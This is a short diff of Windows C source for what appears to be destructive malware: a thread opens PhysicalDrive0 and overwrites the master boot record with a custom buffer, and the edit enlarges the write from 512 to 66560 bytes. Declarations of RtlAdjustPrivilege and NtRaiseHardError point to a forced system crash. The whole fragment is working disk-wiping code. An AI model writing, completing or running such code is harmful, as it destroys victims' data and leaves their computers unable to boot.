@@ -9,16 +9,13 @@ EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
 
 DWORD WINAPI mbr(LPVOID lpParam) {
-	while (1) {
 		DWORD dwBytesWritten;
 		HANDLE hDevice = CreateFileW(
 			L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
 			FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
 			OPEN_EXISTING, 0, 0);
 
-		WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
-		CloseHandle(hDevice);
-	}
+		WriteFile(hDevice, MasterBootRecord, 66560, &dwBytesWritten, 0);
 }
 
 DWORD WINAPI Disable(LPVOID lpParam) {
